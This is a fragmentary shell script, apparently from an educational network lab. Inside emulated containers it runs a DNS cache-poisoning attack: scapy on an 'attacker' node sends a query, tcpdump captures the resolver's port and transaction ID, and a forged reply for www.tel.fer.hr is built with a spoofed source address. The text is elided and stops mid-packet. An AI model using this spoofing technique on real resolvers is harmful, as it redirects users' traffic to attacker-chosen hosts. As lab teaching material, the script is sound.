...
until [ $err -eq 0 ] || [ $count -eq 6 ]; do
    ...
    echo 'import time
time.sleep(2)
send(IP(src="10.0.10.3", dst="10.0.10.2")/UDP(dport=53)/DNS\
(id=43322,qr=0,rd=1,\
...
#exit()' | sudo himage attacker scapy &
    ...
    val=`sudo himage dnsZpm tcpdump -l -c 1 -ni eth0 '(port 53 && dst 10.0.9.2)'`

    port=`echo $val | cut -d' ' -f3 | cut -d'.' -f5`
    id=`echo $val | cut -d' ' -f6`

    # Send the fake DNS reply
    echo "send(IP(src=\"10.0.9.2\", dst=\"10.0.10.2\")/UDP(dport=$port)/DNS\
(id=$id,qr=1,ra=1,\
qd=DNSQR(qname=\"www.tel.fer.hr\"),\
...
ar=DNSRR(rrname=\"dnsTel.tel.fer.hr\",rdata=\"10.0.9.2\")\
